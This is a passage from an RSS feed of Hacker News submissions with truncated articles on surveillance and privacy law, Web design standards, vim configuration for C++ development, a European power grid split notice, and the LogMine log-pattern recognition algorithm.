consumer data on virtually every aspect of people’s lives, including buying preferences, health status, criminal and voting histories, and physical whereabouts.<span title="11: See generally Daniel J. Solove, The Digital Person: Technology and Privacy in the Information Age (2004)." data-indicator="10" data-footnum="11">10</span> For the modern citizen, this level of surveillance can be a form of control; it can be benign, helpful, or harmful, often depending on the perspective of the surveilled.<span title="12: For instance, consider Americans’ split reactions to Edward Snowden’s leaks about National Security Agency surveillance of Americans’ phone records. See Orin Kerr, Edward Snowden’s Impact, Wash. Post (Apr. 9, 2015), https://www.washingtonpost.com/news/volokh-conspiracy/wp/2015/04/09/edward-snowdens-impact [https://perma.cc/3EJQ-V45X]." data-indicator="11" data-footnum="12">11</span> Increasingly, large-scale data sharing between different levels of government and private industry blurs public/private distinctions. For instance, marketers build profiles of Americans using data from public databases and individual online browsing histories, while government agencies such as law enforcement purchase predictive analytic systems from private companies, which build their algorithms using combined public and private sources of data.<span title="13: Mary Madden, Michele Gilman, Karen Levy &amp; Alice Marwick, Privacy, Poverty, and Big Data: A Matrix of Vulnerabilities for Poor Americans, 95 Wash. U. L. Rev. 53, 63, 104–07 (2017)." data-indicator="12" data-footnum="13">12</span></p>
<p>Together, government and private-sector surveillance have created the sense that Americans are universally tracked and that few—except those living purposely “off the grid”—are able to evade government or private-sector surveillance.</p>
<p>While this lack of privacy has raised increasingly vocal concerns, the contemporary phenomenon of non-surveillance—that is, systemic invisibility of large portions of certain classes of people living in the United States—has received less attention. We call this the “surveillance gap,” although we acknowledge that the term is imperfect. While the concept of surveillance is commonly associated with government control of its citizenry, some of the harms that we identify occur in the private sphere. Indeed, we adopt a broader …</p></div></section></div></div></div></article></section></main></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://socialchangenyu.com/review/the-surveillance-gap-the-harms-of-extreme-privacy-and-data-marginalization/">https://socialchangenyu.com/review/the-surveillance-gap-the-harms-of-extreme-privacy-and-data-marginalization/</a></em></p>]]>
            </description>
            <link>https://socialchangenyu.com/review/the-surveillance-gap-the-harms-of-extreme-privacy-and-data-marginalization/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712065</guid>
            <pubDate>Sun, 10 Jan 2021 07:48:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Web Has No Design Standards]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25711575">thread link</a>) | @WoodenChair
<br/>
January 9, 2021 | http://www.observationalhazard.com/2021/01/the-web-has-no-design-standards.html | <a href="https://web.archive.org/web/*/http://www.observationalhazard.com/2021/01/the-web-has-no-design-standards.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-8752676873929759179">
<p>A reader recently complained to me about the hyperlinks on this blog. The reader thought the links were too hard to distinguish from the rest of the text. And the reader’s right. The Swedish Greys desktop theme that I thought looked cool eight years ago, while attractive in an aesthetic sense (to me at least), is not the most usable or accessible. I’ll be looking for another theme.</p>

<p>I was able to style my blog however I wanted to and it looks the same in all browsers. That’s the flexibility of good HTML/CSS standards. Every site can look and behave exactly as the creator envisioned. It’s also why the Web’s a usability nightmare. We have to learn to use every site we visit because every site is designed differently. How come when we talk about Web standards the focus is almost entirely on technical standards? Where is the worry about design standards?</p>

<p>I recently finished reading the classic book <em><a href="https://amzn.to/2JZgkSD">The Design of Everyday Things</a></em> by Don Norman and it talks about standards. Normans says “When all else fails, standardize.” Basically when you have no other way of implementing good design, you turn to standardization so at least every user only needs to learn how to use the similar things (in this case web pages) once. And I think we have no other way, because if we did, we would have figured it out in the past 30 years.</p>

<p>It wasn’t always this way. I remember using the pre-CSS and pre-JavaScript Web as a little kid on Mosaic. You knew there that the blue underlined text was always a hyperlink. And you knew that the back button always took you back a page. And you didn’t have to worry what different actions buttons did, because there was no JavaScript. I’m not saying we should go back there, but in many ways having the constraints made pages easier to use. There was no need to think. Now we have no constraints, but that’s why we need standards.</p>

<p>Every other major consumer computing platform but the Web has design standards. Apple’s platforms are famous for their Human Interface Guidelines. They are an attempt to ensure all apps follow some standard design conventions. Not every app does, but Apple has some ability to enforce them through its app stores, and some users even demand developers follow them. So, they are at least kinda sorta followed by most major apps. If the Web had design standards, maybe users would demand developers follow them too. Google and Microsoft have design suggestions and guidelines for their developers. This is why a good app for each platform feels “at home.”</p>

<p>But we have no design guidelines for the Web that are widely accepted. Sure, people have tried. But the only way we’re going to get something that’s actually followed is if we have a standard. And a standard needs to come from a standards body (Apple, Microsoft, and Google are the standards bodies for their respective platforms). W3C, please put some focus on a design standard. Not everybody will be forced to follow it, but it could do a lot of good in terms of usability.</p>


</div></div>]]>
            </description>
            <link>http://www.observationalhazard.com/2021/01/the-web-has-no-design-standards.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25711575</guid>
            <pubDate>Sun, 10 Jan 2021 06:47:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using (neo)vim for C++ development]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25711091">thread link</a>) | @jubnzv
<br/>
January 9, 2021 | https://idie.ru/posts/vim-modern-cpp | <a href="https://web.archive.org/web/*/https://idie.ru/posts/vim-modern-cpp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <main>
    <h2 id="background">Background</h2>
<p>I’ve been writing code in vim for the past several years, and in this post I’d like to share some tips on configuring a development environment. This post contains some notes on configuration that would have helped me when I first started using vim and working on my own config. I hope that as a result of reading this, you will be able to improve your workflow with some new features and make the development process easier and more convenient.</p>
<p>In this article, we will look at common tasks that occur when editing code and try to automate and improve them using vim. Each section contains a brief description of the problem, a proposed solution, overview of alternatives, a full code listing for the configuration, and a screenshot or animated screencast with a demonstration. At the end, additional links to useful plugins and resources will be provided.</p>
<p>Most of the tasks come down to installing and properly configuring one or more plugins. I assume that you are an experienced vim user and already use one of the plugin managers.</p>
<p>All of these tips are applicable in both vim and neovim. Also, despite the title, some of these tips can be applied not only to C++, but also to any other language.</p>
<h2 id="removing-trailing-whitespaces">Removing trailing whitespaces</h2>
<p>Let’s start with a very simple problem. Some code conventions restrict the leaving of trailing whitespaces. For example, the Linux Kernel <a href="https://www.kernel.org/doc/html/v4.10/process/coding-style.html#spaces">prohibits</a> from doing this.</p>
<p>So we’d like to see when we accidentally leave a space at the end of a line. Let’s add the following lines in your vim configuration file:</p>
<div><pre><code data-lang="vim"><span>highlight</span> <span>ExtraWhitespace</span> <span>ctermbg</span>=<span>red</span> <span>guibg</span>=<span>red</span><span>
</span><span></span><span>match</span> <span>ExtraWhitespace</span> <span>/\s\+$/</span><span>
</span><span></span><span>au</span> <span>BufWinEnter</span> * <span>match</span> <span>ExtraWhitespace</span> <span>/\s\+$/</span><span>
</span><span></span><span>au</span> <span>InsertEnter</span> * <span>match</span> <span>ExtraWhitespace</span> <span>/\s\+\%#\@&lt;!$/</span><span>
</span><span></span><span>au</span> <span>InsertLeave</span> * <span>match</span> <span>ExtraWhitespace</span> <span>/\s\+$/</span><span>
</span><span></span><span>au</span> <span>BufWinLeave</span> * <span>call</span> <span>clearmatches</span>()<span>
</span></code></pre></div><p>As a result, extra whitespaces will be highlighted as follows:</p>
<p><img src="https://idie.ru/static/posts/vim-modern-cpp/trailing-ws.png" alt=""></p>
<p>We also want to remove extra spaces by the single key binding. Let’s define it:</p>
<div><pre><code data-lang="vim"><span>" Remove all trailing whitespaces</span><span>
</span><span></span><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>leader</span>&gt;<span>rs</span> :<span>let</span> <span>_s</span>=@<span>/ &lt;Bar&gt; :%s/</span>\<span>s</span>\+$<span>//</span><span>e</span> &lt;<span>Bar</span>&gt; :<span>let</span> @/=<span>_s</span> &lt;<span>Bar</span>&gt; :<span>nohl</span> &lt;<span>Bar</span>&gt; :<span>unlet</span> <span>_s</span> &lt;<span>CR</span>&gt;<span>
</span></code></pre></div><p>So we can solve this simple problem.</p>
<p>Alternatives:</p>
<ul>
<li>You <a href="https://www.reddit.com/r/vim/comments/82yv3p/anyone_know_how_to_get_the_dots_for_leading/dveznas?utm_source=share&amp;utm_medium=web2x&amp;context=3">can show</a> all whitespaces and line breaks in the source code.</li>
<li>There is <a href="https://editorconfig.org/">editorconfig</a> <a href="https://github.com/editorconfig/editorconfig-vim">plugin</a> for vim that supports the <code>trim_trailing_whitespace</code> option. When it is set to <code>true</code> the plugin will remove any whitespace characters preceding newline characters.</li>
<li>See <a href="##formatting-source-code-with-clang-format">clang-format</a> section below.</li>
</ul>
<h2 id="accessing-standard-library-documentation-using-cppman">Accessing Standard Library documentation using <code>cppman</code></h2>
<p>Vim ships with a man page viewer that works out of the box on any modern *nix via <a href="https://vimhelp.org/filetype.txt.html#ft-man-plugin">:Man</a> command. But the system man pages do not contain the definitions for C++. Let’s fix it by installing <a href="https://github.com/aitjcize/cppman">Cppman</a>.</p>
<p>Cppman is a set of C++ 98/11/14/17/20 manual pages for Linux, with source from <a href="https://cplusplus.com/">cplusplus.com</a> and <a href="https://cppreference.com/">cppreference.com</a>. You can easily install using <code>pip</code> or the package manager for your distribution according to their <a href="https://github.com/aitjcize/cppman#installation">Installation guide</a>. Next, let’s configure vim.</p>
<p>By default, when you press <code>K</code>, vim grabs the keyword under the cursor, separated by <a href="https://vimhelp.org/options.txt.html#%27iskeyword%27">iskeyword</a> symbols. There is one problem. The <code>:</code> symbol often found in C++ definitions is not included in the <code>iskeyword</code> array. So, for example, when you press <code>K</code> under the keyword <code>std::string</code>, vim will try to find the man page for <code>std</code>, instead of the full identifier. Let’s fix it with this small function:</p>
<div><pre><code data-lang="vim"><span>function</span>! <span>s</span>:<span>JbzCppMan</span>()<span>
</span><span></span>    <span>let</span> <span>old_isk</span> = &amp;<span>iskeyword</span><span>
</span><span></span>    <span>setl</span> <span>iskeyword</span>+=:<span>
</span><span></span>    <span>let</span> <span>str</span> = <span>expand</span>(<span>"&lt;cword&gt;"</span>)<span>
</span><span></span>    <span>let</span> &amp;<span>l</span>:<span>iskeyword</span> = <span>old_isk</span><span>
</span><span></span>    <span>execute</span> <span>'Man '</span> . <span>str</span><span>
</span><span></span><span>endfunction</span><span>
</span><span></span><span>command</span>! <span>JbzCppMan</span> :<span>call</span> <span>s</span>:<span>JbzCppMan</span>()<span>
</span></code></pre></div><p>We also need to remap the default <code>K</code> key binding to use our function in C++:</p>
<div><pre><code data-lang="vim"><span>au</span> <span>FileType</span> <span>cpp</span> <span>nnoremap</span> &lt;<span>buffer</span>&gt;<span>K</span> :<span>JbzCppMan</span>&lt;<span>CR</span>&gt;<span>
</span></code></pre></div><p>Here is a result:</p>
<p><img src="https://idie.ru/static/posts/vim-modern-cpp/cppman.png" alt=""></p>
<h2 id="browsing-online-documentation-from-vim">Browsing online documentation from vim</h2>
<p>But what if you also want to quickly access online documentation for your favorite library or framework? Or may be search for unknown keywords on StackOverflow, Google or similar sites? And it is desirable to make a solution that can be easily extended to support more search engines.</p>
<p><a href="https://github.com/tyru/open-browser.vim">open-browser.vim</a> can help us. This is a plugin that allows you open URLs in your favorite browser using vim.</p>
<p>Install it using your package manager. Then let’s add a simple configuration to access cppreference and Qt documentation pages:</p>
<div><pre><code data-lang="vim"><span>let</span> <span>g</span>:<span>openbrowser_search_engines</span> = <span>extend</span>(<span>
</span><span></span>\ <span>get</span>(<span>g</span>:, <span>'openbrowser_search_engines'</span>, {}),<span>
</span><span></span>\ {<span>
</span><span></span>\   <span>'cppreference'</span>: <span>'https://en.cppreference.com/mwiki/index.php?title=Special%3ASearch&amp;search={query}'</span>,<span>
</span><span></span>\   <span>'qt'</span>: <span>'https://doc.qt.io/qt-5/search-results.html?q={query}'</span>,<span>
</span><span></span>\ },<span>
</span><span></span>\ <span>'keep'</span><span>
</span><span></span>\)<span>
</span></code></pre></div><p>And add some convenient key bindings by this way:</p>
<div><pre><code data-lang="vim"><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>leader</span>&gt;<span>osx</span> :<span>call</span> <span>openbrowser</span>#<span>smart_search</span>(<span>expand</span>(<span>'&lt;cword&gt;'</span>), <span>"cppreference"</span>)&lt;<span>CR</span>&gt;<span>
</span><span></span><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>leader</span>&gt;<span>osq</span> :<span>call</span> <span>openbrowser</span>#<span>smart_search</span>(<span>expand</span>(<span>'&lt;cword&gt;'</span>), <span>"qt"</span>)&lt;<span>CR</span>&gt;<span>
</span></code></pre></div><p>As a result we can quickly browse online documentation for the word under the cursor:</p>
<p><img src="https://idie.ru/static/posts/vim-modern-cpp/openbrowser.gif" alt=""></p>
<p>Further use of this plugin is limited only by your imagination. For example, you can use it to search for similar C++ snippets in open source projects on GitHub:</p>
<div><pre><code data-lang="vim"><span>'github-cpp'</span>: <span>'http://github.com/search?l=C%2B%2B&amp;q=fork%3Afalse+language%3AC%2B%2B+{query}&amp;type=Code'</span>,<span>
</span></code></pre></div><p>Or integrate it with <a href="https://grep.app/">grep.app</a> or <a href="https://codesearch.debian.net/">Debian Code Search</a>. Or add integration with your favorite online translation service, if you work with multiple languages. You get the idea. The main thing is to write the configuration correctly.</p>
<p>Alternatives:</p>
<ul>
<li><a href="https://github.com/KabbAmine/zeavim.vim">zeavim.vim</a> is a plugin that implements the integration with <a href="https://zealdocs.org/">Zeal</a> – free and open source offline documentation browser. In fact, it solves the same problem. You may want to use it if you don’t have an internet connection, or you need access to documentation for a specific version of the framework that isn’t available online.</li>
<li><a href="https://github.com/rhysd/devdocs.vim">devdocs.vim</a> is a plugin for <a href="https://devdocs.io/">devdocs</a> which also provides multiple API documentations.</li>
</ul>
<h2 id="switching-between-source-and-header-file">Switching between source and header file</h2>
<p>Switching between source and header files is another common operation when working with C++.</p>
<p>After searching and trying many solutions, I settled on <a href="https://github.com/derekwyatt/vim-fswitch">vim-fswitch</a> plugin. Personally, I like this plugin for its simple configuration for various file types and the absence of third-party dependencies.</p>
<p>Install it with your favorite package manager. It will perfectly works out of the box, but sometimes you want to configure switch destination files like this:</p>
<div><pre><code data-lang="vim"><span>au</span> <span>BufEnter</span> *.<span>h</span>  <span>let</span> <span>b</span>:<span>fswitchdst</span> = <span>"c,cpp,cc,m"</span><span>
</span><span></span><span>au</span> <span>BufEnter</span> *.<span>cc</span> <span>let</span> <span>b</span>:<span>fswitchdst</span> = <span>"h,hpp"</span><span>
</span></code></pre></div><p>It also will be convenient to set up some key bindings:</p>
<div><pre><code data-lang="vim"><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>A</span>-<span>o</span>&gt; :<span>FSHere</span>&lt;<span>cr</span>&gt;<span>
</span><span></span><span>" Extra hotkeys to open header/source in the split</span><span>
</span><span></span><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>localleader</span>&gt;<span>oh</span> :<span>FSSplitLeft</span>&lt;<span>cr</span>&gt;<span>
</span><span></span><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>localleader</span>&gt;<span>oj</span> :<span>FSSplitBelow</span>&lt;<span>cr</span>&gt;<span>
</span><span></span><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>localleader</span>&gt;<span>ok</span> :<span>FSSplitAbove</span>&lt;<span>cr</span>&gt;<span>
</span><span></span><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>localleader</span>&gt;<span>ol</span> :<span>FSSplitRight</span>&lt;<span>cr</span>&gt;<span>
</span></code></pre></div><p>Alternatives:</p>
<ul>
<li>There are many other options described in this <a href="https://vim.fandom.com/wiki/Easily_switch_between_source_and_header_file">vimwiki article</a>. You can try them or write your own solution.</li>
</ul>

<p><code>ctags</code> is a convenient indexing tool that allows you to go to symbol definition from your project using <code>tags</code> database. This is an old and reliable tool, that is <a href="https://kernelnewbies.org/FAQ/CodeBrowsing">recommended</a> <a href="https://stackoverflow.com/a/33682137/8541499">to use</a> for large code bases like Linux Kernel where other tools like LSP may get stuck.</p>
<p>The most actual and maintained implementation of ctags is <a href="https://github.com/universal-ctags/ctags">universal-ctags</a>. It is available in all popular distributions.</p>
<p>Vim has integrated ctags support. But here is one annoying thing. We need to generate <code>tags</code> database for each project using something like <code>ctags -R .</code>. Moreover, we need re-generate <code>tags</code> when editing the project.</p>
<p>This of course can be automated. Install <a href="https://github.com/ludovicchabant/vim-gutentags">vim-guttentags</a> is a plugin that will asynchronously (re)generate tag files as you work. I also suggest adding a simple configuration to avoid indexing of some unwanted files:</p>
<div><pre><code data-lang="vim"><span>set</span> <span>tags</span>=./<span>tags</span>;<span>
</span><span></span><span>let</span> <span>g</span>:<span>gutentags_ctags_exclude_wildignore</span> = <span>1</span><span>
</span><span></span><span>let</span> <span>g</span>:<span>gutentags_ctags_exclude</span> = [<span>
</span><span></span>  \<span>'node_modules'</span>, <span>'_build'</span>, <span>'build'</span>, <span>'CMakeFiles'</span>, <span>'.mypy_cache'</span>, <span>'venv'</span>,<span>
</span><span></span>  \<span>'*.md'</span>, <span>'*.tex'</span>, <span>'*.css'</span>, <span>'*.html'</span>, <span>'*.json'</span>, <span>'*.xml'</span>, <span>'*.xmls'</span>, <span>'*.ui'</span>]<span>
</span></code></pre></div><p>This makes your workflow simpler and more convenient. See also <a href="https://vim.fandom.com/wiki/Browsing_programs_with_tags">this</a> detailed vimwiki article if you need more information about using ctags.</p>
<h2 id="exploring-source-file-structure-with-vistavim">Exploring source file structure with <code>vista.vim</code></h2>
<p>When you are working with unfamiliar source code, it may be convenient to browse the structure of the current source file. What classes, functions, macroses are defined here?</p>
<p><a href="https://github.com/liuchengxu/vista.vim">vista.vim</a> is a plugin that helps us. It opens a split with the current file definitions. Here is what it looks like:</p>
<p><img src="https://idie.ru/static/posts/vim-modern-cpp/vista.png" alt=""></p>
<p>This plugin shows both LSP and ctags symbols. The LSP configuration is beyond the scope of this post, but it is a very useful feature that can give more accurate information.</p>
<p>To use it, install <a href="https://github.com/liuchengxu/vista.vim">vista.vim</a> with your favorite package manager and add a convenient key binding to toggle Vista split:</p>
<div><pre><code data-lang="vim"><span>nnoremap</span> &lt;<span>silent</span>&gt; &lt;<span>A</span><span>-6</span>&gt; :<span>Vista</span>!!&lt;<span>CR</span>&gt;<span>
</span></code></pre></div><p>Alternatives:</p>
<ul>
<li><a href="https://github.com/preservim/tagbar">tagbar</a> is another plugin that provides a way to get the overview of the file structure. Unlike vista.vim, it doesn’t support LSP symbols and doesn’t provide useful utility functions for retrieving the information about the symbol under the cursor. But it’s simpler and more reliable.</li>
</ul>
<h2 id="display-the-current-function-in-the-status-line">Display the current function in the status line</h2>
<p>Another feature of <a href="https://github.com/liuchengxu/vista.vim">vista.vim</a> is that it shares information of the symbol under the cursor. Using this we can display the current function name in the status line. This helps us navigate when moving through a large file.</p>
<p>Bellow is an example of configuration for the <a href="https://github.com/itchyny/lightline.vim">lightline</a>, but you can easily adapt it to your status bar:</p>
<div><pre><code data-lang="vim"><span>function</span>! <span>LightlineCurrentFunctionVista</span>() <span>abort</span><span>
</span><span></span>  <span>let</span> <span>l</span>:<span>method</span> = <span>get</span>(<span>b</span>:, <span>'vista_nearest_method_or_function'</span>, <span>''</span>)<span>
</span><span></span>  <span>if</span> <span>l</span>:<span>method</span> != <span>''</span><span>
</span><span></span>    <span>let</span> <span>l</span>:<span>method</span> = <span>'['</span> . <span>l</span>:<span>method</span> . <span>']'</span><span>
</span><span></span>  <span>endif</span><span>
</span><span></span>  <span>return</span> <span>l</span>:<span>method</span><span>
</span><span></span><span>endfunction</span><span>
</span><span></span><span>au</span> <span>VimEnter</span> * <span>call</span> <span>vista</span>#<span>RunForNearestMethodOrFunction</span>()<span>
</span></code></pre></div><p>Here’s what it looks like:</p>
<p><img src="https://idie.ru/static/posts/vim-modern-cpp/current-function.gif" alt=""></p>
<p>Is you need the complete lightline configuration, see <a href="https://github.com/jubnzv/dotfiles/blob/dd46c2d940c13a0db8d94b02934659018358579a/.config/nvim/init.vim#L435-L462">this snippet</a> and take a look at lightline documentation.</p>
<p>Alternatives:</p>
<ul>
<li>There are many alternatives provided by popular LSP plugins. For example, <a href="https://github.com/nvim-lua/lsp-status.nvim">lsp-status.nvim</a> can provide the same information for Neovim’s built-in LSP server.</li>
</ul>
<h2 id="vimspector-interactive-debugging-inside-vim">vimspector: Interactive …</h2></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://idie.ru/posts/vim-modern-cpp">https://idie.ru/posts/vim-modern-cpp</a></em></p>]]>
            </description>
            <link>https://idie.ru/posts/vim-modern-cpp</link>
            <guid isPermaLink="false">hacker-news-small-sites-25711091</guid>
            <pubDate>Sun, 10 Jan 2021 05:59:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[System split registered in the synchronous area of Continental Europe]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25711075">thread link</a>) | @nip
<br/>
January 9, 2021 | https://www.entsoe.eu/news/2021/01/08/system-split-registered-in-the-synchronous-area-of-continental-europe-incident-now-resolved | <a href="https://web.archive.org/web/*/https://www.entsoe.eu/news/2021/01/08/system-split-registered-in-the-synchronous-area-of-continental-europe-incident-now-resolved">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>The synchronous area of Continental Europe was split into two separated grid regions between 14h05 CET and 15h08 CET when it was reconnected on 8 January 2021.</p><p>An area in the south east region of the interconnected grid was during that period separated from the rest of Continental Europe. A temporary frequency drop of approximately 250 mHz was registered. Coordinated actions and an immediate response taken by the Continental European Transmission System Operators ensured that the system stability was not affected in most European countries.</p><p>An investigation is ongoing on the cause of this system split and further information on this incident will be made in due course.</p><p>Should you have questions, send them at <a href="https://www.entsoe.eu/news/2021/01/08/media@entsoe.eu">media@entsoe.eu</a> or contact us at the following telephone number: +32 476 97 50 93.</p></div></div></div></div>]]>
            </description>
            <link>https://www.entsoe.eu/news/2021/01/08/system-split-registered-in-the-synchronous-area-of-continental-europe-incident-now-resolved</link>
            <guid isPermaLink="false">hacker-news-small-sites-25711075</guid>
            <pubDate>Sun, 10 Jan 2021 05:57:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Log Pattern Recognition: LogMine]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25710991">thread link</a>) | @trungdq88
<br/>
January 9, 2021 | https://sayr.us/log-pattern-recognition/logmine/ | <a href="https://web.archive.org/web/*/https://sayr.us/log-pattern-recognition/logmine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>When retrieving logs from an application, you are often looking for outliers
(such as a unique error) or what pattern occurs the most. However, defining
patterns manually is time-consuming and requires rigour across projects. In
this series of blog posts, we are going to explore automated Log Pattern
Recognition.</p>

<h2 id="why">Why</h2>

<p>I recently began using <a href="https://docs.datadoghq.com/logs/explorer/patterns/">Datadog Log Pattern</a>
and became addicted to it. Unfortunately, I was not able to find such a feature on
Kibana or a query proxy able to do this analysis. If that does not exist, I
might as well learn more about it and make one!</p>

<p>To my surprise, I did not find as many papers as I thought I would. And the
number of papers with public implementations is even lower. Our series begins
with a paper called <a href="https://www.cs.unm.edu/~mueen/Papers/LogMine.pdf">LogMine: Fast Pattern Recognition for Log Analytics</a>
and <a href="https://github.com/trungdq88/logmine">an implementation made by Tony Dinh</a>
that helped me a lot to study LogMine’s behavior.</p>

<p>To my surprise, I searched for anything related to LogMine on Hacker News
and only found Tony Dinh’s submission.</p>

<h2 id="defining-the-terms-used-in-this-article">Defining the terms used in this article</h2>

<p>Some terms used in this article can have several meanings. In Logmine’s context,
the terms I use mean:</p>
<ul>
  <li><code>log</code>: a log line (<code>string</code>)
    <div><div><pre><code>12:00:00 - My awesome log
</code></pre></div>    </div>
  </li>
  <li><code>pattern</code>: Expression extracted by the algorithm (array of <code>field</code>)
    <div><div><pre><code>[&lt;date&gt;, "-", "My", "awesome", "log"]
</code></pre></div>    </div>
  </li>
  <li><code>field</code>: Part of a <code>pattern</code> / Word from a <code>log</code> (Either a fixed value, a wildcard or a <code>variable</code>)</li>
  <li><code>cluster</code>: represents a group of logs that were identified as close to each
others</li>
  <li><code>variable</code>: a user-provided regex used to identify a known format
    <div><div><pre><code>number = \d+
time = \d{2}:\d{2}:\d{2}
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="an-introduction-to-logmine">An introduction to LogMine</h2>

<p>The LogMine paper describes a method to parse logs, group them into clusters and
extract patterns without any prior knowledge or supervision. LogMine can be
implemented using MapReduce and works in a single pass over the dataset.</p>

<p>LogMine’s approach to grouping logs roughly works by:</p>
<ol>
  <li>Parsing logs into patterns</li>
  <li>Grouping patterns into clusters if the <a href="#clustering">distance</a> between them is small</li>
  <li>Merging clusters into a single pattern</li>
  <li>Repeat from step 2 until you are satisfied</li>
</ol>

<p>LogMine classifies fields into three categories:</p>
<ul>
  <li><code>Fixed value</code>, a field that is constant across all logs in a cluster. This is
detected at the pattern extraction step.</li>
  <li><code>Variable</code>, a field that matches a pattern provided by the user. This is
detected at the pre-processing step.</li>
  <li><code>Wildcard</code>, a field that is not constant across all logs in a cluster. This is
detected at the pattern extraction step.</li>
</ul>

<p>Let’s illustrate how it works, step by step, using three simple logs:</p>

<div><div><pre><code>10:00:00 - [DEBUG] - User 123 disconnected
10:30:00 - [DEBUG] - User 123 disconnected
11:11:11 - [ERROR] - An error occurred while disconnecting user 456
12:12:12 - [DEBUG] - User 789 disconnected
</code></pre></div></div>

<p>We will also define a variable <code>&lt;time&gt;</code> that follows the pattern
<code>\d{2}:\d{2}:\d{2}</code>.</p>

<div>
  <p><strong>Note</strong></p>

  <p>A good practice would be to define more variables to avoid forming two clusters
from logs with low similarity. For instance, we <strong>should</strong> define <code>&lt;number&gt;</code>
as <code>\d+</code>.</p>

  <p>Depending on the pattern of your logs, defining a common field like <code>&lt;log-level&gt;</code>
as <code>[(DEBUG|INFO|WARNING|ERROR)]</code> might end up hiding information. This is
because a <code>WARNING</code> log with an error message might not be that important yet
the same log message with an <code>ERROR</code> level might have the exact information
you would like to highlight.</p>
</div>

<h3 id="log-parsing-and-dense-clusters-identification">Log parsing and dense clusters identification</h3>

<p>The first step is to parse logs into patterns and identify dense clusters. Dense
clusters are clusters where <strong>raw logs are almost identical</strong>.</p>

<p>To do this, we begin by splitting logs into patterns (an array of field). The
separator used by default is any whitespace character.</p>

<table>
  <thead>
    <tr>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Field_1</annotation></semantics></math></span></span></th>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">Field_2</annotation></semantics></math></span></span></th>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">Field_3</annotation></semantics></math></span></span></th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">Field_n</annotation></semantics></math></span></span></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>10:00:00</td>
      <td>-</td>
      <td>[DEBUG]</td>
      <td>-</td>
      <td>User</td>
      <td>123</td>
      <td>disconnected</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>10:30:00</td>
      <td>-</td>
      <td>[DEBUG]</td>
      <td>-</td>
      <td>User</td>
      <td>123</td>
      <td>disconnected</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>11:11:11</td>
      <td>-</td>
      <td>[ERROR]</td>
      <td>-</td>
      <td>An</td>
      <td>error</td>
      <td>occurred</td>
      <td>while</td>
      <td>…</td>
    </tr>
    <tr>
      <td>12:12:12</td>
      <td>-</td>
      <td>[DEBUG]</td>
      <td>-</td>
      <td>User</td>
      <td>789</td>
      <td>disconnected</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
  </tbody>
</table>

<p>Next, we will tokenize the logs and identify variables (regex provided by the
user).</p>

<table>
  <thead>
    <tr>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Field_1</annotation></semantics></math></span></span></th>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">Field_2</annotation></semantics></math></span></span></th>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">Field_3</annotation></semantics></math></span></span></th>
      <th>&nbsp;</th>
